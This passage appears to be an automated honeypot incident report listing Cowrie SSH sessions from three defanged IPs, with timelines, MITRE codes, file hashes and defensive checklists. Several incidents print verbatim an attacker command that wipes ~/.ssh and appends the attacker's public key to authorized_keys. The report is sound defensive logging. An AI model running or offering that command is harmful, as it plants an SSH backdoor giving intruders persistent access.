| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 04:48:16` | `cowrie.session.connect` |
| `2026-04-22 04:48:16` | `cowrie.client.version` |
| `2026-04-22 04:48:16` | `cowrie.client.kex` |
| `2026-04-22 04:48:17` | `cowrie.login.success` |
| `2026-04-22 04:48:17` | `cowrie.session.params` |
| `2026-04-22 04:48:17` | `cowrie.command.input` |
| `2026-04-22 04:48:17` | `cowrie.command.failed` |
| `2026-04-22 04:48:17` | `cowrie.log.closed` |
| `2026-04-22 04:48:17` | `cowrie.session.params` |
| `2026-04-22 04:48:17` | `cowrie.command.input` |
| `2026-04-22 04:48:18` | `cowrie.session.file_download` |
| `2026-04-22 04:48:18` | `cowrie.log.closed` |
| `2026-04-22 04:48:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.163.39[.]213` to AbuseIPDB if not already reported
- [ ] Block `51.163.39[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0bbc14b7a99

| Field | Detail |
|---|---|
| **Source IP** | `101.32.240[.]31` |
| **First Seen** | 2026-04-22 04:48 |
| **Last Seen** | 2026-04-22 04:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 04:48:17` | `cowrie.session.connect` |
| `2026-04-22 04:48:17` | `cowrie.client.version` |
| `2026-04-22 04:48:17` | `cowrie.client.kex` |
| `2026-04-22 04:48:18` | `cowrie.login.success` |
| `2026-04-22 04:48:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.32.240[.]31` to AbuseIPDB if not already reported
- [ ] Block `101.32.240[.]31` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43a849b02bc4

| Field | Detail |
|---|---|
| **Source IP** | `51.163.39[.]213` |
| **First Seen** | 2026-04-22 04:48 |
| **Last Seen** | 2026-04-22 04:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 04:48:20` | `cowrie.session.connect` |
| `2026-04-22 04:48:20` | `cowrie.client.version` |
| `2026-04-22 04:48:20` | `cowrie.client.kex` |
| `2026-04-22 04:48:20` | `cowrie.login.success` |
| `2026-04-22 04:48:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.163.39[.]213` to AbuseIPDB if not already reported
- [ ] Block `51.163.39[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c32a3f983dd

| Field | Detail |
|---|---|
| **Source IP** | `172.206.32[.]4` |
| **First Seen** | 2026-04-22 04:49 |
| **Last Seen** | 2026-04-22 04:49 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 04:49:16` | `cowrie.session.connect` |
| `2026-04-22 04:49:16` | `cowrie.client.version` |
| `2026-04-22 04:49:16` | `cowrie.client.kex` |
| `2026-04-22 04:49:17` | `cowrie.login.success` |
| `2026-04-22 04:49:17` | `cowrie.session.params` |
| `2026-04-22 04:49:17` | `cowrie.command.input` |
| `2026-04-22 04:49:17` | `cowrie.command.failed` |
| `2026-04-22 04:49:18` | `cowrie.log.closed` |
| `2026-04-22 04:49:18` | `cowrie.session.params` |
| `2026-04-22 04:49:18` | `cowrie.command.input` |
| `2026-04-22 04:49:18` | `cowrie.session.file_download` |
| `2026-04-22 04:49:18` | `cowrie.log.closed` |
| `2026-04-22 04:49:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.206.32[.]4` to AbuseIPDB if not already reported
- [ ] Block `172.206.32[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-380a056e122f

| Field | Detail |
|---|---|
| **Source IP** | `172.206.32[.]4` |
| **First Seen** | 2026-04-22 04:49 |
| **Last Seen** | 2026-04-22 04:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 04:49:21` | `cowrie.session.connect` |
| `2026-04-22 04:49:21` | `cowrie.client.version` |
| `2026-04-22 04:49:21` | `cowrie.client.kex` |
| `2026-04-22 04:49:22` | `cowrie.login.success` |
| `2026-04-22 04:49:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.206.32[.]4` to AbuseIPDB if not already reported
- [ ] Block `172.206.32[.]4` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2376b6e72f19

| Field | Detail |
|---|---|
| **Source IP** | `101.32.240[.]31` |
| **First Seen** | 2026-04-22 04:49 |
| **Last Seen** | 2026-04-22 04:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 04:49:59` | `cowrie.session.connect` |
| `2026-04-22 04:49:59` | `cowrie.client.version` |
| `2026-04-22 04:49:59` | `cowrie.client.kex` |
| `2026-04-22 04:50:00` | `cowrie.login.success` |
| `2026-04-22 04:50:00` | `cowrie.session.params` |
| `2026-04-22 04:50:00` | `cowrie.command.input` |
| `2026-04-22 04:50:00` | `cowrie.command.failed` |
| `2026-04-22 04:50:00` | `cowrie.log.closed` |
| `2026-04-22 04:50:00` | `cowrie.session.params` |
| `2026-04-22 04:50:00` | `cowrie.command.input` |
| `2026-04-22 04:50:00` | `cowrie.session.file_download` |
| `2026-04-22 04:50:00` | `cowrie.log.closed` |
| `2026-04-22 04:50:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.32.240[.]31` to AbuseIPDB if not already reported
- [ ] Block `101.32.240[.]31` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6113b83d5d3b

| Field | Detail |
|---|---|
| **Source IP** | `101.32.240[.]31` |
| **First Seen** | 2026-04-22 04:50 |
| **Last Seen** | 2026-04-22 04:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 04:50:02` | `cowrie.session.connect` |
| `2026-04-22 04:50:02` | `cowrie.client.version` |
| `2026-04-22 04:50:02` | `cowrie.client.kex` |
| `2026-04-22 04:50:02` | `cowrie.login.success` |
| `2026-04-22 04:50:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.32.240[.]31` to AbuseIPDB if not already reported
- [ ] Block `101.32.240[.]31` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-341028ad0a33

| Field | Detail |
|---|---|
| **Source IP** | `51.163.39[.]213` |
| **First Seen** | 2026-04-22 04:51 |
| **Last Seen** | 2026-04-22 04:51 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 04:51:12` | `cowrie.session.connect` |
| `2026-04-22 04:51:12` | `cowrie.client.version` |
| `2026-04-22 04:51:12` | `cowrie.client.kex` |
| `2026-04-22 04:51:13` | `cowrie.login.success` |
| `2026-04-22 04:51:13` | `cowrie.session.params` |
| `2026-04-22 04:51:13` | `cowrie.command.input` |
| `2026-04-22 04:51:13` | `cowrie.command.failed` |
| `2026-04-22 04:51:13` | `cowrie.log.closed` |
| `2026-04-22 04:51:14` | `cowrie.session.params` |
| `2026-04-22 04:51:14` | `cowrie.command.input` |
| `2026-04-22 04:51:14` | `cowrie.session.file_download` |
| `2026-04-22 04:51:14` | `cowrie.log.closed` |
| `2026-04-22 04:51:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.163.39[.]213` to AbuseIPDB if not already reported
- [ ] Block `51.163.39[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ddb13260bc8e

| Field | Detail |
|---|---|
| **Source IP** | `51.163.39[.]213` |
| **First Seen** | 2026-04-22 04:51 |
| **Last Seen** | 2026-04-22 04:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 04:51:16` | `cowrie.session.connect` |
| `2026-04-22 04:51:16` | `cowrie.client.version` |
| `2026-04-22 04:51:16` | `cowrie.client.kex` |
| `2026-04-22 04:51:17` | `cowrie.login.success` |
| `2026-04-22 04:51:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.163.39[.]213` to AbuseIPDB if not already reported
- [ ] Block `51.163.39[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be834ce0f311

| Field | Detail |
|---|---|
| **Source IP** | `51.163.39[.]213` |
| **First Seen** | 2026-04-22 04:52 |
| **Last Seen** | 2026-04-22 04:52 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 04:52:39` | `cowrie.session.connect` |
| `2026-04-22 04:52:39` | `cowrie.client.version` |
| `2026-04-22 04:52:39` | `cowrie.client.kex` |
| `2026-04-22 04:52:40` | `cowrie.login.success` |
| `2026-04-22 04:52:40` | `cowrie.session.params` |
| `2026-04-22 04:52:40` | `cowrie.command.input` |
| `2026-04-22 04:52:40` | `cowrie.command.failed` |
| `2026-04-22 04:52:40` | `cowrie.log.closed` |
| `2026-04-22 04:52:41` | `cowrie.session.params` |
| `2026-04-22 04:52:41` | `cowrie.command.input` |
| `2026-04-22 04:52:41` | `cowrie.session.file_download` |
| `2026-04-22 04:52:41` | `cowrie.log.closed` |
| `2026-04-22 04:52:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.163.39[.]213` to AbuseIPDB if not already reported
- [ ] Block `51.163.39[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7728c05d6699

| Field | Detail |
|---|---|
| **Source IP** | `51.163.39[.]213` |
| **First Seen** | 2026-04-22 04:52 |
| **Last Seen** | 2026-04-22 04:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 04:52:43` | `cowrie.session.connect` |
| `2026-04-22 04:52:43` | `cowrie.client.version` |
| `2026-04-22 04:52:43` | `cowrie.client.kex` |
| `2026-04-22 04:52:43` | `cowrie.login.success` |
| `2026-04-22 04:52:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.163.39[.]213` to AbuseIPDB if not already reported
- [ ] Block `51.163.39[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88c7ea2986ac

| Field | Detail |
|---|---|
| **Source IP** | `172.206.32[.]4` |
| **First Seen** | 2026-04-22 04:52 |
| **Last Seen** | 2026-04-22 04:52 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 04:52:45` | `cowrie.session.connect` |
| `2026-04-22 04:52:45` | `cowrie.client.version` |
| `2026-04-22 04:52:46` | `cowrie.client.kex` |
| `2026-04-22 04:52:47` | `cowrie.login.success` |
| `2026-04-22 04:52:47` | `cowrie.session.params` |
| `2026-04-22 04:52:47` | `cowrie.command.input` |
| `2026-04-22 04:52:47` | `cowrie.command.failed` |
| `2026-04-22 04:52:47` | `cowrie.log.closed` |
| `2026-04-22 04:52:48` | `cowrie.session.params` |
| `2026-04-22 04:52:48` | `cowrie.command.input` |
| `2026-04-22 04:52:48` | `cowrie.session.file_download` |
| `2026-04-22 04:52:48` | `cowrie.log.closed` |
| `2026-04-22 04:52:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.206.32[.]4` to AbuseIPDB if not already reported
- [ ] Block `172.206.32[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b92a4a324b28

| Field | Detail |
|---|---|
| **Source IP** | `172.206.32[.]4` |
| **First Seen** | 2026-04-22 04:52 |
| **Last Seen** | 2026-04-22 04:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 04:52:51` | `cowrie.session.connect` |
| `2026-04-22 04:52:51` | `cowrie.client.version` |
| `2026-04-22 04:52:51` | `cowrie.client.kex` |
| `2026-04-22 04:52:52` | `cowrie.login.success` |
| `2026-04-22 04:52:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.206.32[.]4` to AbuseIPDB if not already reported
- [ ] Block `172.206.32[.]4` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df8eb294c20b

| Field | Detail |
|---|---|
| **Source IP** | `101.32.240[.]31` |
| **First Seen** | 2026-04-22 04:53 |
| **Last Seen** | 2026-04-22 04:53 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 04:53:20` | `cowrie.session.connect` |
| `2026-04-22 04:53:20` | `cowrie.client.version` |
| `2026-04-22 04:53:21` | `cowrie.client.kex` |
| `2026-04-22 04:53:21` | `cowrie.login.success` |
| `2026-04-22 04:53:21` | `cowrie.session.params` |
| `2026-04-22 04:53:21` | `cowrie.command.input` |
| `2026-04-22 04:53:21` | `cowrie.command.failed` |
| `2026-04-22 04:53:21` | `cowrie.log.closed` |
| `2026-04-22 04:53:21` | `cowrie.session.params` |
| `2026-04-22 04:53:21` | `cowrie.command.input` |
| `2026-04-22 04:53:21` | `cowrie.session.file_download` |
| `2026-04-22 04:53:21` | `cowrie.log.closed` |
| `2026-04-22 04:53:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.32.240[.]31` to AbuseIPDB if not already reported
- [ ] Block `101.32.240[.]31` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6dfdf1f90448

| Field | Detail |
|---|---|
| **Source IP** | `101.32.240[.]31` |
| **First Seen** | 2026-04-22 04:53 |
| **Last Seen** | 2026-04-22 04:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 04:53:23` | `cowrie.session.connect` |
| `2026-04-22 04:53:23` | `cowrie.client.version` |
| `2026-04-22 04:53:23` | `cowrie.client.kex` |
| `2026-04-22 04:53:23` | `cowrie.login.success` |
| `2026-04-22 04:53:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.32.240[.]31` to AbuseIPDB if not already reported
- [ ] Block `101.32.240[.]31` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31c759392c74

| Field | Detail |
|---|---|
| **Source IP** | `51.163.39[.]213` |
| **First Seen** | 2026-04-22 04:53 |
| **Last Seen** | 2026-04-22 04:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 04:53:24` | `cowrie.session.connect` |
| `2026-04-22 04:53:24` | `cowrie.client.version` |
| `2026-04-22 04:53:24` | `cowrie.client.kex` |
| `2026-04-22 04:53:25` | `cowrie.login.success` |
| `2026-04-22 04:53:25` | `cowrie.session.params` |
| `2026-04-22 04:53:25` | `cowrie.command.input` |
| `2026-04-22 04:53:25` | `cowrie.command.failed` |
| `2026-04-22 04:53:25` | `cowrie.log.closed` |
| `2026-04-22 04:53:25` | `cowrie.session.params` |
| `2026-04-22 04:53:25` | `cowrie.command.input` |
| `2026-04-22 04:53:25` | `cowrie.session.file_download` |
| `2026-04-22 04:53:25` | `cowrie.log.closed` |
| `2026-04-22 04:53:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.163.39[.]213` to AbuseIPDB if not already reported
- [ ] Block `51.163.39[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a1fa9ff001e

| Field | Detail |
|---|---|
| **Source IP** | `51.163.39[.]213` |
| **First Seen** | 2026-04-22 04:53 |
| **Last Seen** | 2026-04-22 04:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 04:53:27` | `cowrie.session.connect` |
| `2026-04-22 04:53:27` | `cowrie.client.version` |
| `2026-04-22 04:53:28` | `cowrie.client.kex` |
| `2026-04-22 04:53:28` | `cowrie.login.success` |
| `2026-04-22 04:53:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.163.39[.]213` to AbuseIPDB if not already reported
- [ ] Block `51.163.39[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d05e210ee31

| Field | Detail |
|---|---|
| **Source IP** | `101.32.240[.]31` |
| **First Seen** | 2026-04-22 04:55 |
| **Last Seen** | 2026-04-22 04:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
